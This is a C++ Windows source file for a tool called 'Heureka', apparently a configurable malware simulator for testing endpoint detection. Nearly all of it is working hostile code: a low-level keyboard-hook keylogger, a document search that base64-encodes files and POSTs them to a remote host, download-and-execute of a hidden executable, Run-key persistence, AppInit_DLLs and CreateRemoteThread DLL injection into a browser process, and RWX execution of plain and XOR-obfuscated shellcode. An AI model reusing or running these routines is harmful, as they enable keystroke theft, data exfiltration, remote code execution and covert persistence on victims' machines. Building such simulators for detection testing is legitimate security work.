#include<iostream>
#include<Windows.h>
#include<winhttp.h>
#include<ctime>
#include<psapi.h>
#include<Lmcons.h>
#include<Strsafe.h>
#include "heurekaconfig.h"
#include "base64.h"

// namespace setup
using namespace std;

// utility functions
void print_status(char* fmt,...){
	TCHAR full_status[MAX_STATUS]="[+] \0";
	StringCchCat(full_status,MAX_STATUS,fmt);
	StringCchCat(full_status,MAX_STATUS,"\n");
	va_list args;
    va_start(args,fmt);
    vprintf(full_status,args);
    va_end(args);
}

void print_error(char* fmt,...){
	TCHAR full_status[MAX_STATUS]="[!] \0";
	StringCchCat(full_status,MAX_STATUS,fmt);
	StringCchCat(full_status,MAX_STATUS,"\n");
	va_list args;
    va_start(args,fmt);
    vprintf(full_status,args);
    va_end(args);
}

// Task functions

#if HOOK_KEYBOARD==1
HANDLE hFile;
LRESULT CALLBACK hook_proc( int code, WPARAM wParam, LPARAM lParam ){
	KBDLLHOOKSTRUCT*  kbd = (KBDLLHOOKSTRUCT*)lParam;
	DWORD dwWritten;
	if (  code < 0||   (kbd->flags & 0x10)) return CallNextHookEx( NULL, code, wParam, lParam );
	
	WriteFile(hFile, &kbd->vkCode, 1,&dwWritten,NULL);
	print_status("Key pressed: %X (%d)",kbd->vkCode,dwWritten);
	return CallNextHookEx( NULL, code, wParam, lParam );
}

void hook_keyboard(){
	print_status("hook_keyboard begins");
	
	TCHAR tmppath[MAX_PATH];
	
	ZeroMemory(tmppath,MAX_PATH);
	DWORD err=GetTempPath(MAX_PATH,tmppath);
	if (err>MAX_PATH || err==0){
		print_error("Unable to retreive TEMP path");
		return;
	}
	if (strcat_s(tmppath,MAX_PATH,"heureka.log")!=0){
		print_error("Unable to generate TEMP filename");
	}
	print_status("Generated filename: %s",tmppath);
	
	hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
	if (hFile==INVALID_HANDLE_VALUE){
		print_error("Unable to create file in TEMP (%d)",GetLastError());
		return;
	}
	print_status("Created keylog: %s",tmppath);

	HHOOK thehook = SetWindowsHookEx( WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0 );
	print_status("Hook set, waiting for input");
	
	MessageBox(NULL, "Keylogger is running", "Heureka", MB_OK);
	
	CloseHandle(hFile);
	UnhookWindowsHookEx(thehook);
	
	print_status("hook_keyboard ends");
}
#endif

#if WEB_SEND_RECV==1 
void web_send_recv(unsigned char *blob=NULL,size_t size=0){
	BOOL  bResults = FALSE;
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;
	print_status("web_send_recv begins");

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(  L"Heureka", 
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, 
                             WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect( hSession, remote_host,
                                   INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP Request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
                                       remote_resource, 
                                       NULL, WINHTTP_NO_REFERER, 
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       0);

    // Send a Request.

    if (hRequest) {
		if (!blob || !size){
			bResults = WinHttpSendRequest( hRequest, 
                                       WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
                                       0, 0);
		}else{
			string blob_base64=base64_encode((unsigned char *)blob, size);
			DWORD len=strlen(blob_base64.c_str());
			bResults = WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,0, (LPVOID*)(blob_base64.c_str()),len,len, 0);
		}
	}
    // PLACE ADDITIONAL CODE HERE.

    // Report any errors.
    if (!bResults)
        print_error( "Error %d has occurred.", GetLastError());
	else{
		DWORD bytesRead=0;
		LPVOID responseBuf[10240];
		bResults = WinHttpReceiveResponse( hRequest, NULL);
		WinHttpReadData(hRequest, responseBuf,10240,&bytesRead);
		print_status("Received bytes: %d",bytesRead);
	}



    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
	print_status("web_send_recv ends");
}
#endif

#if DOWNLOAD_EXEC==1 
void download_exec(bool exec=true){
	BOOL  bResults = FALSE;
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;
	print_status("download_exec begins");

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(  L"Heureka", 
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, 
                             WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect( hSession, download_exec_host,
                                   INTERNET_DEFAULT_HTTP_PORT, 0);
	else{
		print_error("No session!");
		return;
	}

    // Create an HTTP Request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
                                       download_exec_resource, 
                                       NULL, WINHTTP_NO_REFERER, 
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       0);
	else{
		print_error("No connection!");
		WinHttpCloseHandle(hSession);
		return;
	}

    // Send a Request.

    if (hRequest) {
		bResults = WinHttpSendRequest( hRequest, 
                                       WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
                                       0, 0);
	}else{
		print_error("No Request");
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return;
	}
 

    // Report any errors.
    if (!bResults){
        print_error( "Error %d has occurred.", GetLastError());
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
	}else{
		DWORD bytesRead=0;
		//LPVOID responseBuf[10240];
		void *responseBuf=malloc(10240000);
		bResults = WinHttpReceiveResponse( hRequest, NULL);
		WinHttpReadData(hRequest, responseBuf,10240000,&bytesRead);
		print_status("Received bytes: %d",bytesRead);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		HANDLE hFile;
	
		TCHAR tmppath[MAX_PATH];
		ZeroMemory(tmppath,MAX_PATH);
		DWORD err=GetTempPath(MAX_PATH,tmppath);
		DWORD dwWritten=0;
		if (err>MAX_PATH || err==0){
			print_error("Unable to retreive TEMP path");
			return; 
		}
		if (strcat_s(tmppath,MAX_PATH,"heureka_downloadexec.exe")!=0){
			print_error("Unable to generate TEMP filename"); 
			return;
		}

		hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
		if (hFile==INVALID_HANDLE_VALUE){
			err=GetLastError();
			print_error("Unable to create file in TEMP");
			return; 
		}
		WriteFile(hFile, responseBuf, bytesRead,&dwWritten,NULL);
		CloseHandle(hFile);
		free(responseBuf);
		print_status("Created file: %s (%d)",tmppath,dwWritten);
		if(exec){
			print_status("Launching file");
			ShellExecute(NULL,"open",tmppath,"",NULL,SW_HIDE);
		}
	}

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
	print_status("download_exec ends");
}
#endif

#if SEARCH_DOCS==1 
void search_docs(){
	
	HANDLE hFind;
	TCHAR username[UNLEN+1];
	DWORD size=UNLEN+1;

	print_status("search_docs starts");

	if (!GetUserName(username, &size)){
		print_error("GetUserName failed");
		return;
	}
	print_status("Username: %s",username);
	for (int i=0;i<sizeof(search_docs_paths)/sizeof(TCHAR*);i++){
		TCHAR search_path[MAX_PATH];
		StringCbPrintf(search_path,MAX_PATH,search_docs_paths[i],username);
		for (int j=0;j<sizeof(search_docs_patterns)/sizeof(TCHAR*);j++){
			TCHAR search_pattern[MAX_PATH];
			WIN32_FIND_DATA FindFileData;
			StringCbPrintf(search_pattern,MAX_PATH,"%s\\%s",search_path,search_docs_patterns[j]);
			print_status("Searching for files like %s",search_pattern);
			hFind = FindFirstFile(search_pattern, &FindFileData);
			if (hFind == INVALID_HANDLE_VALUE) 
			{
				print_error("FindFirstFile failed (%d)",GetLastError());
			} 
			else 
			{
				do{
					print_status("File found: %s", FindFileData.cFileName);
#if WEB_SEND_RECV==1 
					DWORD dwBytesRead = 0;
					char ReadBuffer[10240] = {0};
					TCHAR filePath[MAX_PATH];
					StringCbPrintf(filePath,MAX_PATH,"%s\\%s",search_path,FindFileData.cFileName);
					HANDLE hFile=CreateFile(filePath,FILE_GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
					
					if (hFile==INVALID_HANDLE_VALUE){
						print_error("Unable to open file for reading (%d): %s",GetLastError(),filePath);
						continue;
					}

					if( FALSE == ReadFile(hFile, ReadBuffer, 10240-1, &dwBytesRead, NULL) )
					{
						print_error("Unable to read from file");
					}
					print_status("Sendind %d bytes",dwBytesRead);
					web_send_recv((unsigned char*)ReadBuffer,dwBytesRead);
					CloseHandle(hFile);
#endif
				}while (FindNextFile(hFind, &FindFileData) != 0);
				FindClose(hFind);
			}
		}
	}
   print_status("dll_inject_registry ends");
}
#endif

#if DLL_INJECT_REGISTRY==1
/*
DLLs listed under the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs 
will be loaded into every process that links to User32.dll when that DLL attaches itself to the process.
Needs Administrative privileges!
*/
void dll_inject_registry(){
	HKEY hk;
	DWORD dwDisp;

	print_status("dll_inject_registry starts");
	
	if (DWORD err=RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
		print_error("Could not create the AppInitDLL registry key.");
		return;
	}
	print_status("Successfully created handle to the AppInitDLL registry key.");
	
	if (RegSetValueEx(hk,       // subkey handle 
			"AppInit_DLLs",			// value name 
			0,                  // must be zero 
			REG_SZ,      // value type 
			(LPBYTE) DLL_INJECT_DLL_PATH,	// pointer to value data 
			(DWORD) (strlen(DLL_INJECT_DLL_PATH)+1))) // data size
	{
		print_error("Could not set AppInitDLL entry value."); 
	}else{
		print_status("Successfully set AppInitDLL entry value."); 
	}
	RegCloseKey(hk); 
	print_status("dll_inject_registry ends");

}
#endif

#if SET_STARTUP_REGISTRY==1
void set_startup_registry(){
	char mypath[MAX_PATH];
	HKEY hk;
	DWORD dwDisp;

	print_status("set_startup_registry starts");
	
	GetModuleFileName( NULL, mypath, MAX_PATH );
	
	if (DWORD err=RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
		print_error("Could not create the registry key.");
		return;
	}
	print_status("Successfully crated handle to registry key");

	if (RegSetValueEx(hk,       // subkey handle 
			"Heureka",			// value name 
			0,                  // must be zero 
			REG_SZ,      // value type 
			(LPBYTE) mypath,	// pointer to value data 
			(DWORD) (strlen(mypath)+1))) // data size
	{
		print_error("Could not set startup entry value."); 
	}else{
		print_status("Successfully set startup entry value."); 
	}
	RegCloseKey(hk); 
	print_status("set_startup_registry ends");
}
#endif

#if DLL_INJECT==1

#ifdef DLL_INJECT_CALL
void* GetPayloadExportAddr( LPCSTR lpPath, HMODULE hPayloadBase, LPCSTR lpFunctionName ) {
  HMODULE hLoaded = LoadLibrary( lpPath );

  if( hLoaded == NULL ) {
	  print_error("Unable to load module: %d",GetLastError());
	return NULL;
  } else {
    void* lpFunc = GetProcAddress( hLoaded, lpFunctionName );
	if (lpFunc==NULL){
		print_error("Unable to retreive proc address! %s",lpFunctionName);
		return NULL;
	}
    DWORD dwOffset = (char*)lpFunc - (char*)hLoaded;

    FreeLibrary( hLoaded );
	DWORD sum=(DWORD)hPayloadBase + dwOffset;
    char* ret=(char*)sum;
	print_status("Calculated proc address: %x",ret);
	return ret;
  }
}
#endif

void dll_inject(){
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

	print_status("dll_inject starts");

	HMODULE hKernel32=GetModuleHandle("Kernel32");
	
	ZeroMemory(&si,sizeof(si));
	si.cb=sizeof(si);
	ZeroMemory(&pi,sizeof(pi));

	
    HANDLE hP=NULL;
	DWORD hPid=0;
	#ifdef DLL_INJECT_ENUM_PROC
	DWORD aProcesses[1024], cbNeeded, cProcesses;
    if(EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
    {
		cProcesses = cbNeeded / sizeof(DWORD);
		for (unsigned int i = 0; i < cProcesses; i++ ){
			if( aProcesses[i] != 0 )
			{
				TCHAR szProcessName[MAX_PATH];
				HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
				if (NULL != hProcess )
				{
					HMODULE hMod;
					DWORD cbNeeded;

					if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ){
						GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
					}
					if (strstr(szProcessName,DLL_INJECT_ENUM_PROC)){
						
						hPid=aProcesses[i];
						hP=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,hPid);
						print_status("Found IE Process: %d",hPid);
						CloseHandle(hProcess);
						break;
					}
					CloseHandle(hProcess);
				}
				
			}
		}
    }
	#endif
	if (hP==NULL){
		if( !CreateProcess( DLL_INJECT_EXE_PATH,   
			"",				// Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			0,              // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi )           // Pointer to PROCESS_INFORMATION structure
		) 
		{
			print_error( "CreateProcess failed (IE)");
			return;
		}	
		print_status("IE process created with PID: %d",pi.dwProcessId);
		hP=pi.hProcess;
		hPid=pi.dwProcessId;
	}
	print_status("Process handle: %p",hP);
	void* pLibRemote=VirtualAllocEx(hP, NULL, sizeof(DLL_INJECT_DLL_PATH),MEM_COMMIT, PAGE_READWRITE );
	WriteProcessMemory(hP, pLibRemote, (void*)DLL_INJECT_DLL_PATH,sizeof(DLL_INJECT_DLL_PATH), NULL );
	HANDLE hThread=CreateRemoteThread( hP, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );

	print_status("Remote Thread: %p", hThread);
	WaitForSingleObject( hThread, INFINITE );

#ifdef DLL_INJECT_CALL!=NULL
	HMODULE hInjected;
	GetExitCodeThread( hThread, ( LPDWORD )&hInjected );
	void* lpInit = GetPayloadExportAddr( (LPCSTR)DLL_INJECT_DLL_PATH, hInjected, DLL_INJECT_CALL );
	if( lpInit != NULL ){
		HANDLE hThread2 = CreateRemoteThread( hP, NULL, 0, (LPTHREAD_START_ROUTINE)lpInit, NULL, 0, NULL );

		if( hThread != NULL ) {
			CloseHandle( hThread2 );
		}
	}
#endif

	CloseHandle(hThread);	
	WaitForSingleObject(hP, INFINITE );
	CloseHandle(hP);
	//CloseHandle(pi.hThread);
	print_status("dll_inject ends");
}
#endif

#if SHELLCODE==1 && ALLOC_RWX_CALL==1
/*
Allocates writable and executable memory, writes and runs shellcode.
*/
void alloc_rwx_call(){
	print_status("alloc_rwx_call starts");  
	LPVOID p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(p,shellcode,sizeof(shellcode));
	((void(*)())p)();
	VirtualFree(p,NULL,MEM_RELEASE);
	print_status("alloc_rwx_call ends");
}
#endif

#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
/*
Allocates writable and executable memory, writes deobfuscates and runs shellcode.
*/
void alloc_rwx_xor_call(){
	print_status("alloc_rwx_xor_call starts");
	LPVOID p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(p,shellcode_xor,sizeof(shellcode_xor));
	for (int i=0;i<sizeof(shellcode_xor);i++){
		((unsigned char *)p)[i]=(unsigned char)(shellcode_xor[i]^XOR_key);
	}
	((void(*)())p)();
	VirtualFree(p,NULL,MEM_RELEASE);
	print_status("alloc_rwx_xor_call ends");
}
#endif

#if WRITE_LOG==1
/*
Creates a hidden file in a temporary directory and writes information about the local host.
*/
void write_log(){
	print_status("write_log starts");
	HANDLE hFile;
	
	TCHAR tmppath[MAX_PATH];
	DWORD err;
	
	ZeroMemory(tmppath,MAX_PATH);
	err=GetTempPath(MAX_PATH,tmppath);
	if (err>MAX_PATH || err==0){
		print_error("Unable to retreive TEMP path");
		return;
	}
	if (strcat_s(tmppath,MAX_PATH,"heureka.dll")!=0){
		print_error("Unable to generate TEMP filename");
	}

	hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
	if (hFile==INVALID_HANDLE_VALUE){
		err=GetLastError();
		print_error("Unable to create file in TEMP");
		return;
	}

	TCHAR buffer[256] = TEXT("");
    
    DWORD dwSize = sizeof(buffer);
    DWORD dwWritten=0;

	char time_buf[22];
	time_t now;
	time(&now);
	strftime(time_buf, 22, "%Y-%m-%dT%H:%S:%MZ\0", gmtime(&now));
	WriteFile(hFile, time_buf, strlen(time_buf),&dwWritten,NULL);
			
    for (int cnf = 0; cnf < ComputerNameMax; cnf++)
    {
        if (!GetComputerNameEx((COMPUTER_NAME_FORMAT)cnf, buffer, &dwSize))
        {
            print_error("GetComputerNameEx failed");
            return;
        }
        else{ 
			WriteFile(hFile, buffer, dwSize,&dwWritten,NULL);
		}
        dwSize = _countof(buffer);
        ZeroMemory(buffer, dwSize);
    }

	CloseHandle(hFile);
	print_status("write_log ends");
}
#endif

#if WRITE_HOSTS==1
void write_hosts(){
	print_status("write_hosts starts");
	HANDLE hFile;

	hFile=CreateFile("c:\\windows\\system32\\drivers\\etc\\hosts",FILE_GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL); // TODO installation dependent file path
	if (hFile==INVALID_HANDLE_VALUE){
		print_error("Unable to access hosts file: %d",GetLastError());
		return;
	}

    DWORD dwWritten=0;
	const char host_buf[]="127.0.0.1\theureka.local\r\n";
	WriteFile(hFile, host_buf, strlen(host_buf),&dwWritten,NULL);
			
	CloseHandle(hFile);
	print_status("write_hosts ends");
}
#endif

// end of test functions - program entry point 
int main(int argc,char **argv){
	// set everything up
	setvbuf(stdout, NULL, _IONBF, 0);
	
	// test functions

	#if WRITE_LOG==1
	write_log();
	#endif

	#if WRITE_HOSTS==1
	write_hosts();
	#endif

	#if DLL_INJECT==1
	dll_inject();
	#endif

	#if SET_STARTUP_REGISTRY==1
	set_startup_registry();
	#endif

	#if DLL_INJECT_REGISTRY==1
	dll_inject_registry();
	#endif

	#if SEARCH_DOCS==1
	search_docs();
	#endif

	#if WEB_SEND_RECV==1 
	web_send_recv((unsigned char*)"AAAA",4);
	#endif

	#if DOWNLOAD_EXEC==1 
	download_exec();
	#endif

	#if HOOK_KEYBOARD==1
	hook_keyboard();
	#endif

	#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
	alloc_rwx_xor_call();
	#endif

	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
	alloc_rwx_call();
	#endif

	// clean up and exit
	return 1;
}